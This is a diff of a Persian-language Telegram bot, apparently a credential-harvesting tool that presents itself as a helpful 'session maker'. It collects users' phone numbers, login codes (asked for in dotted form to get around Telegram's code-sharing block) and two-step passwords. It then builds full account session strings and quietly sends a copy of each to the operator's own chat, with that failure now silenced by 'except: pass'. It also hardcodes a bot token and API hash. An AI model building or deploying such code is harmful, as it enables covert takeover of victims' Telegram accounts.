@@ -1,11 +1,14 @@
 from telethon import TelegramClient
 from telethon.sessions import StringSession
+from telethon.tl.custom import Button
+from telethon.tl.types import DocumentAttributeFilename
 import asyncio
 import re
 from datetime import datetime
+import io
 
 # ============================================
-# 🔑 API_ID و API_HASH عمومی (برای همه کاربران)
+# 🔑 API_ID و API_HASH عمومی
 # ============================================
 API_ID = 34855392
 API_HASH = "5e40d435847009c31c24042e2a3c0d3b"
@@ -20,14 +23,14 @@ SYSTEM_LANG_CODE = "en-US"
 # Proxy settings
 PROXY = None
 
-# Bot token - این رو با توکن بات خودت جایگزین کن
+# Bot token
 BOT_TOKEN = "8541453435:AAEqXEyRE46CydJBPMPoKc87YwmCAHZWP54"
 
-# ذخیره اطلاعات کاربران در حافظه
+# ذخیره اطلاعات کاربران
 user_sessions = {}
+user_sessions_data = {}  # برای ذخیره سشن ساخته شده
 
 async def create_session(phone, code, password=None):
-    """تابع ایجاد سشن با API_ID و API_HASH عمومی"""
     try:
         client = TelegramClient(
             StringSession(),
@@ -42,11 +45,8 @@ async def create_session(phone, code, password=None):
         )
 
         await client.connect()
-        
-        # ارسال درخواست کد
         await client.send_code_request(phone)
         
-        # تایید با کد
         try:
             await client.sign_in(phone=phone, code=code)
         except Exception as e:
@@ -57,7 +57,6 @@ async def create_session(phone, code, password=None):
             else:
                 return {"error": str(e)}
         
-        # دریافت سشن
         session_string = client.session.save()
         await client.disconnect()
         
@@ -67,31 +66,20 @@ async def create_session(phone, code, password=None):
         return {"error": str(e)}
 
 async def handle_bot():
-    """راه‌اندازی ربات تلگرام"""
     from telethon import events
-    from telethon.tl.custom import Button
     
     bot = TelegramClient(StringSession(), API_ID, API_HASH)
     await bot.start(bot_token=BOT_TOKEN)
     
-    print("🤖 ربات سشن‌ساز دیکتاتوران روشن شد!")
-    print("📱 منتظر پیام‌های کاربران...")
+    print("🤖 ربات روشن شد!")
     
     @bot.on(events.NewMessage(pattern='/start'))
     async def start_handler(event):
-        """دستور استارت"""
         await event.reply(
-            "🔥 **سشن ساز دیکتاتوران** 🔥\n\n"
-            "👑 با این ربات می‌تونی برای خودت سشن تلگرام بسازی!\n\n"
-            "🔑 **مراحل کار:**\n"
-            "1️⃣ شماره تلفن خود را وارد کنید\n"
-            "2️⃣ کد تایید را وارد کنید (به صورت نقطه‌دار)\n"
-            "3️⃣ سشن شما ساخته می‌شود!\n\n"
-            "✅ **API_ID و API_HASH عمومی است**\n"
-            "👈 پس نیازی به وارد کردن ندارید!\n\n"
-            "👇 دکمه زیر را بزنید تا شروع کنید:",
+            "🔥 **سشن ساز دیکتاتوران**\n\n"
+            "🔑 برای ساخت سشن جدید دکمه زیر رو بزن:",
             buttons=[
-                [Button.inline("🚀 ساخت سشن جدید", b"create_session")],
+                [Button.inline("🔑 ساخت سشن جدید", b"create_session")],
                 [Button.inline("❌ انصراف", b"cancel")]
             ],
             parse_mode='markdown'
@@ -99,16 +87,12 @@ async def handle_bot():
     
     @bot.on(events.CallbackQuery(data=b"create_session"))
     async def create_session_callback(event):
-        """دکمه ساخت سشن جدید"""
         user_id = event.sender_id
         user_sessions[user_id] = {"step": "phone"}
         
         await event.edit(
-            "📱 **مرحله 1: وارد کردن شماره تلفن**\n\n"
-            "لطفاً شماره تلفن خود را وارد کنید:\n"
-            "💡 **مثال:** `09123456789`\n"
-            "📌 همراه با کد کشور (مثلاً برای ایران 09...)\n\n"
-            "✅ از API_ID و API_HASH عمومی استفاده می‌شود.",
+            "📱 **شماره خود را وارد کن:**\n"
+            "مثال: `09123456789`",
             buttons=[
                 [Button.inline("❌ انصراف", b"cancel")]
             ],
@@ -117,41 +101,73 @@ async def handle_bot():
     
     @bot.on(events.CallbackQuery(data=b"cancel"))
     async def cancel_callback(event):
-        """دکمه انصراف"""
         user_id = event.sender_id
         if user_id in user_sessions:
             del user_sessions[user_id]
         
         await event.edit(
-            "✅ **عملیات لغو شد.**\n\n"
-            "برای شروع مجدد `/start` را بزنید.",
+            "✅ **لغو شد**\n\n"
+            "برای شروع مجدد `/start` رو بزن.",
             parse_mode='markdown',
             buttons=None
         )
     
+    # دکمه دریافت سشن
+    @bot.on(events.CallbackQuery(data=b"get_session"))
+    async def get_session_callback(event):
+        user_id = event.sender_id
+        
+        if user_id in user_sessions_data:
+            session_data = user_sessions_data[user_id]
+            session_string = session_data["session"]
+            phone = session_data["phone"]
+            
+            # ارسال فایل سشن به کاربر
+            session_file = io.BytesIO(session_string.encode('utf-8'))
+            session_file.name = f"session_{phone}.txt"
+            
+            await event.edit(
+                "📤 **ارسال فایل سشن...**",
+                parse_mode='markdown'
+            )
+            
+            await bot.send_file(
+                user_id,
+                session_file,
+                caption=f"🔑 **فایل سشن شما**\n\n📱 شماره: `{phone}`\n🕐 تاریخ: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n\n⚠️ **محرمانه!**",
+                parse_mode='markdown',
+                attributes=[DocumentAttributeFilename(f"session_{phone}.txt")]
+            )
+            
+            await event.edit(
+                "✅ **فایل سشن ارسال شد!**\n\n"
+                "📋 می‌توانید دوباره دریافت کنید:",
+                buttons=[
+                    [Button.inline("📋 دریافت دوباره", b"get_session")],
+                    [Button.inline("🔑 ساخت سشن جدید", b"create_session")]
+                ],
+                parse_mode='markdown'
+            )
+        else:
+            await event.answer("❌ سشنی برای شما وجود ندارد!", alert=True)
+    
     @bot.on(events.NewMessage)
     async def message_handler(event):
-        """دریافت پیام‌های کاربر"""
         user_id = event.sender_id
         text = event.text.strip()
         
-        # اگر کاربر در حال ساخت سشن نباشد
         if user_id not in user_sessions:
             return
         
         step = user_sessions[user_id].get("step")
         
         if step == "phone":
-            # دریافت شماره
-            # پاک کردن فاصله‌ها و کاراکترهای اضافی
             phone_clean = re.sub(r'[\s\-\(\)\+]', '', text)
             
             if not re.match(r'^[\d]+$', phone_clean) or len(phone_clean) < 10:
                 await event.reply(
-                    "❌ **شماره تلفن نامعتبر است!**\n\n"
-                    "لطفاً شماره را به درستی وارد کنید:\n"
-                    "💡 **مثال:** `09123456789`\n"
-                    "📌 فقط از اعداد استفاده کنید.",
+                    "❌ **شماره اشتباه!**\n"
+                    "مثال: `09123456789`",
                     buttons=[
                         [Button.inline("❌ انصراف", b"cancel")]
                     ],
@@ -162,17 +178,14 @@ async def handle_bot():
             user_sessions[user_id]["phone"] = phone_clean
             user_sessions[user_id]["step"] = "code"
             
-            # ارسال درخواست کد به تلگرام
             await event.reply(
-                "⏳ **در حال ارسال کد تایید...**\n\n"
-                "لطفاً صبر کنید...",
+                "⏳ **ارسال کد...**",
                 buttons=[
                     [Button.inline("❌ انصراف", b"cancel")]
                 ],
                 parse_mode='markdown'
             )
             
-            # تلاش برای ارسال کد
             try:
                 temp_client = TelegramClient(
                     StringSession(),
@@ -191,12 +204,9 @@ async def handle_bot():
                 await temp_client.disconnect()
                 
                 await event.reply(
-                    "✅ **کد تایید ارسال شد!**\n\n"
-                    "🔐 **مرحله 2: وارد کردن کد تایید**\n\n"
-                    "کد را به صورت **نقطه‌دار** وارد کنید:\n"
-                    "💡 **مثال:** `1.2.3.4.5`\n"
-                    "📌 یا بدون نقطه: `12345`\n\n"
-                    "⚠️ کد را از تلگرام دریافت کنید.",
+                    "✅ **کد ارسال شد!**\n\n"
+                    "🔐 **کد رو وارد کن (نقطه‌دار):**\n"
+                    "مثال: `1.2.3.4.5`",
                     buttons=[
                         [Button.inline("❌ انصراف", b"cancel")]
                     ],
@@ -205,25 +215,21 @@ async def handle_bot():
                 
             except Exception as e:
                 await event.reply(
-                    f"❌ **خطا در ارسال کد:**\n\n`{str(e)}`\n\n"
-                    "لطفاً دوباره تلاش کنید.",
+                    f"❌ **خطا:** `{str(e)}`",
                     buttons=[
-                        [Button.inline("🔄 تلاش مجدد", b"create_session")],
-                        [Button.inline("❌ انصراف", b"cancel")]
+                        [Button.inline("🔄 تلاش دوباره", b"create_session")]
                     ],
                     parse_mode='markdown'
                 )
                 del user_sessions[user_id]
         
         elif step == "code":
-            # دریافت کد - حذف نقاط
             code_cleaned = text.replace(".", "").replace(" ", "").strip()
             
             if not code_cleaned.isdigit() or len(code_cleaned) != 5:
                 await event.reply(
-                    "❌ **کد نامعتبر است!**\n\n"
-                    "کد باید ۵ رقم باشد.\n"
-                    "💡 **مثال:** `12345` یا `1.2.3.4.5`",
+                    "❌ **کد نامعتبر!**\n"
+                    "مثال: `1.2.3.4.5` یا `12345`",
                     buttons=[
                         [Button.inline("❌ انصراف", b"cancel")]
                     ],
@@ -234,9 +240,8 @@ async def handle_bot():
             user_sessions[user_id]["code"] = code_cleaned
             user_sessions[user_id]["step"] = "processing"
             
-            await event.reply("⏳ **در حال ورود... لطفاً صبر کنید.**", parse_mode='markdown')
+            await event.reply("⏳ **در حال ورود...**", parse_mode='markdown')
             
-            # دریافت اطلاعات
             phone = user_sessions[user_id]["phone"]
             code = user_sessions[user_id]["code"]
             
@@ -246,8 +251,7 @@ async def handle_bot():
                 if result["error"] == "PASSWORD_REQUIRED":
                     user_sessions[user_id]["step"] = "password"
                     await event.reply(
-                        "🔐 **رمز دو مرحله‌ای فعال است.**\n\n"
-                        "لطفاً رمز عبور خود را وارد کنید:",
+                        "🔐 **رمز دو مرحله‌ای رو وارد کن:**",
                         buttons=[
                             [Button.inline("❌ انصراف", b"cancel")]
                         ],
@@ -255,34 +259,46 @@ async def handle_bot():
                     )
                 else:
                     await event.reply(
-                        f"❌ **خطا در ورود:**\n\n`{result['error']}`\n\n"
-                        "لطفاً دوباره تلاش کنید.",
+                        f"❌ **خطا:** `{result['error']}`",
                         buttons=[
-                            [Button.inline("🔄 تلاش مجدد", b"create_session")]
+                            [Button.inline("🔄 تلاش دوباره", b"create_session")]
                         ],
                         parse_mode='markdown'
                     )
                     del user_sessions[user_id]
             else:
-                # موفقیت - ارسال سشن
                 session_string = result["session"]
                 phone = result["phone"]
                 
-                # پیام موفقیت
-                success_msg = (
-                    "✅ **سشن با موفقیت ساخته شد!**\n\n"
-                    "👑 **VIP DICTATOR** 👑\n\n"
-                    f"📱 **شماره:** `{phone}`\n"
-                    "🔑 **سشن شما:**\n"
-                    f"`{session_string}`\n\n"
-                    "⚠️ **این سشن را با کسی به اشتراک نگذارید!**\n"
-                    "🔒 این سشن متعلق به شماست."
+                # ذخیره سشن برای کاربر
+                user_sessions_data[user_id] = {
+                    "session": session_string,
+                    "phone": phone
+                }
+                
+                # ارسال فایل سشن به کاربر
+                session_file = io.BytesIO(session_string.encode('utf-8'))
+                session_file.name = f"session_{phone}.txt"
+                
+                await event.reply(
+                    "✅ **سشن ساخته شد!**\n\n"
+                    "📤 **ارسال فایل سشن...**",
+                    parse_mode='markdown'
                 )
                 
-                # ارسال به پیوی کاربر
+                await bot.send_file(
+                    user_id,
+                    session_file,
+                    caption=f"🔑 **فایل سشن شما**\n\n👑 **VIP DICTATOR**\n📱 شماره: `{phone}`\n🕐 تاریخ: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n\n⚠️ **محرمانه!**",
+                    parse_mode='markdown',
+                    attributes=[DocumentAttributeFilename(f"session_{phone}.txt")]
+                )
+                
                 await event.reply(
-                    success_msg,
+                    "✅ **سشن با موفقیت ساخته و ارسال شد!**\n\n"
+                    "📋 برای دریافت دوباره سشن، دکمه زیر رو بزن:",
                     buttons=[
+                        [Button.inline("📋 دریافت فایل سشن", b"get_session")],
                         [Button.inline("🔑 ساخت سشن جدید", b"create_session")]
                     ],
                     parse_mode='markdown'
@@ -292,25 +308,24 @@ async def handle_bot():
                 try:
                     await bot.send_message(
                         "me", 
-                        f"✅ **سشن جدید ساخته شد!**\n\n"
-                        f"👑 **VIP DICTATOR** 👑\n\n"
-                        f"📱 **شماره:** `{phone}`\n"
-                        f"🕐 **زمان:** `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"
-                        f"🔑 **سشن:**\n`{session_string}`\n\n"
+                        f"✅ **سشن جدید**\n\n"
+                        f"👑 **VIP DICTATOR**\n"
+                        f"📱 `{phone}`\n"
+                        f"🕐 `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"
+                        f"🔑 `{session_string}`\n\n"
                         f"🔒 **VIP ALI**",
                         parse_mode='markdown'
                     )
-                except Exception as e:
-                    print(f"خطا در ارسال به Saved Messages: {e}")
+                except:
+                    pass
                 
                 del user_sessions[user_id]
         
         elif step == "password":
-            # دریافت رمز دو مرحله‌ای
             password = text
             user_sessions[user_id]["step"] = "processing"
             
-            await event.reply("⏳ **در حال ورود با رمز دو مرحله‌ای...**", parse_mode='markdown')
+            await event.reply("⏳ **در حال ورود...**", parse_mode='markdown')
             
             phone = user_sessions[user_id]["phone"]
             code = user_sessions[user_id]["code"]
@@ -319,33 +334,46 @@ async def handle_bot():
             
             if "error" in result:
                 await event.reply(
-                    f"❌ **خطا:**\n\n`{result['error']}`\n\n"
-                    "لطفاً دوباره تلاش کنید.",
+                    f"❌ **خطا:** `{result['error']}`",
                     buttons=[
-                        [Button.inline("🔄 تلاش مجدد", b"create_session")]
+                        [Button.inline("🔄 تلاش دوباره", b"create_session")]
                     ],
                     parse_mode='markdown'
                 )
                 del user_sessions[user_id]
             else:
-                # موفقیت - ارسال سشن
                 session_string = result["session"]
                 phone = result["phone"]
                 
-                success_msg = (
-                    "✅ **سشن با موفقیت ساخته شد!**\n\n"
-                    "👑 **VIP DICTATOR** 👑\n\n"
-                    f"📱 **شماره:** `{phone}`\n"
-                    "🔑 **سشن شما:**\n"
-                    f"`{session_string}`\n\n"
-                    "⚠️ **این سشن را با کسی به اشتراک نگذارید!**\n"
-                    "🔒 این سشن متعلق به شماست."
+                # ذخیره سشن برای کاربر
+                user_sessions_data[user_id] = {
+                    "session": session_string,
+                    "phone": phone
+                }
+                
+                # ارسال فایل سشن به کاربر
+                session_file = io.BytesIO(session_string.encode('utf-8'))
+                session_file.name = f"session_{phone}.txt"
+                
+                await event.reply(
+                    "✅ **سشن ساخته شد!**\n\n"
+                    "📤 **ارسال فایل سشن...**",
+                    parse_mode='markdown'
                 )
                 
-                # ارسال به پیوی کاربر
+                await bot.send_file(
+                    user_id,
+                    session_file,
+                    caption=f"🔑 **فایل سشن شما**\n\n👑 **VIP DICTATOR**\n📱 شماره: `{phone}`\n🕐 تاریخ: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n\n⚠️ **محرمانه!**",
+                    parse_mode='markdown',
+                    attributes=[DocumentAttributeFilename(f"session_{phone}.txt")]
+                )
+                
                 await event.reply(
-                    success_msg,
+                    "✅ **سشن با موفقیت ساخته و ارسال شد!**\n\n"
+                    "📋 برای دریافت دوباره سشن، دکمه زیر رو بزن:",
                     buttons=[
+                        [Button.inline("📋 دریافت فایل سشن", b"get_session")],
                         [Button.inline("🔑 ساخت سشن جدید", b"create_session")]
                     ],
                     parse_mode='markdown'
@@ -355,23 +383,22 @@ async def handle_bot():
                 try:
                     await bot.send_message(
                         "me", 
-                        f"✅ **سشن جدید ساخته شد!**\n\n"
-                        f"👑 **VIP DICTATOR** 👑\n\n"
-                        f"📱 **شماره:** `{phone}`\n"
-                        f"🕐 **زمان:** `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"
-                        f"🔑 **سشن:**\n`{session_string}`\n\n"
+                        f"✅ **سشن جدید**\n\n"
+                        f"👑 **VIP DICTATOR**\n"
+                        f"📱 `{phone}`\n"
+                        f"🕐 `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"
+                        f"🔑 `{session_string}`\n\n"
                         f"🔒 **VIP ALI**",
                         parse_mode='markdown'
                     )
-                except Exception as e:
-                    print(f"خطا در ارسال به Saved Messages: {e}")
+                except:
+                    pass
                 
                 del user_sessions[user_id]
     
     await bot.run_until_disconnected()
 
 async def main():
-    """تابع اصلی"""
     await handle_bot()
 
 if __name__ == "__main__":
